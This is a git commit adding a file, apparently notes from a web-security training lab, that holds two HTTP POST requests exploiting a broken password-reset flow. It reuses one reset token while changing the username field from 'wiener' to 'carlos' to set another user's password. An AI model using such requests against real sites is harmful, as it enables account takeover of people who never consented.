ba0dc13cf20ad24aaf462e92ee9c26dd442a141b
Pranjal <pranjalruhela2811@gmail.com>
2023-07-10 16:54:41 +0530

    pass_reset

---
+++ App Logic Vulns/Password reset broken logic/payload.js
@@ -0,0 +1,14 @@
+/*
+
+
+POST /forgot-password?temp-forgot-password-token=jyitDqwuxxVFhaQdW2Xjhvt3iAnrXOxm
+temp-forgot-password-token=jyitDqwuxxVFhaQdW2Xjhvt3iAnrXOxm&username=
+wiener&new-password-1=peter&new-password-2=peter
+
+
+POST /forgot-password?temp-forgot-password-token=jyitDqwuxxVFhaQdW2Xjhvt3iAnrXOxm
+temp-forgot-password-token=jyitDqwuxxVFhaQdW2Xjhvt3iAnrXOxm&username=
+carlos&new-password-1=peter&new-password-2=peter
+
+
+*/
